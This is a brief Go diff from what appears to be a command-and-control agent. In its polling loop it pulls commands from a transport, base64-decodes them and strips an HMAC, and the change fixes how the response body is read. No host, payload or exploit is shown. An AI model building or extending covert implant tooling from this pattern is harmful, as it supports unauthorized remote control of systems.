@@ -22,7 +22,8 @@ func main() {
 		for {
 			resp := transports.PullCommand()
 			if resp != nil {
-				decoded_body, _ := base64.RawURLEncoding.DecodeString(string(resp.Bytes()))
+				bodybytes, _ := io.ReadAll(resp.Body)
+				decoded_body, _ := base64.RawURLEncoding.DecodeString(string(bodybytes))
 				totalLen := len(decoded_body)
 				if totalLen > 0 {
 					respBytes := decoded_body[:totalLen-cryptography.HmacHashLen]
